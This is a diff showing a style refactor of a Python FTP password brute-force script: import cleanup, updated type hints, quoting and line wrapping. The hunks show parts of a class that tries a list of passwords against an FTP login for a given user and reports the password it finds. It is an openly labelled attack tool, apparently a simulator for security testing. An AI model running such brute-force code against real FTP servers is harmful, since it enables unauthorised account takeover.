@@ -9,24 +9,28 @@ License: Proprietary
 Version: 1.0.0
 """
 
-import os, sys, argparse
+import argparse
+import os
+import sys
 from ftplib import FTP
-from typing import Dict, Any, List
+from typing import Any
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
 try:
     from logger import get_logger
 except ImportError:
     import logging
+
     def get_logger(name):
         logger = logging.getLogger(name)
         if not logger.handlers:
             handler = logging.StreamHandler()
-            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
             handler.setFormatter(formatter)
             logger.addHandler(handler)
             logger.setLevel(logging.INFO)
         return logger
+
 
 logger = get_logger(__name__)
 
@@ -34,7 +38,9 @@ logger = get_logger(__name__)
 class FTPBruteForceAttack:
     """FTP brute force attack simulator."""
 
-    def __init__(self, host: str, port: int, username: str, passwords: List[str], verbose: bool = False):
+    def __init__(
+        self, host: str, port: int, username: str, passwords: list[str], verbose: bool = False
+    ):
         self.host = host
         self.port = port
         self.username = username
@@ -56,9 +62,11 @@ class FTPBruteForceAttack:
                 logger.debug(f"Failed with password '{password}': {e}")
             return False
 
-    def execute(self) -> Dict[str, Any]:
+    def execute(self) -> dict[str, Any]:
         """Execute the brute force attack."""
-        logger.info(f"Starting FTP brute force for user '{self.username}' with {len(self.passwords)} passwords")
+        logger.info(
+            f"Starting FTP brute force for user '{self.username}' with {len(self.passwords)} passwords"
+        )
 
         found_password = None
 
@@ -83,7 +91,7 @@ class FTPBruteForceAttack:
             stats = {
                 "attempts": self.attempts,
                 "success": found_password is not None,
-                "password": found_password
+                "password": found_password,
             }
             return stats
 
@@ -104,7 +112,7 @@ def main():
     print("=" * 80)
     try:
         args = parse_arguments()
-        with open(args.passwords, 'r') as f:
+        with open(args.passwords) as f:
             passwords = [line.strip() for line in f if line.strip()]
 
         attack = FTPBruteForceAttack(args.host, args.port, args.username, passwords, args.verbose)
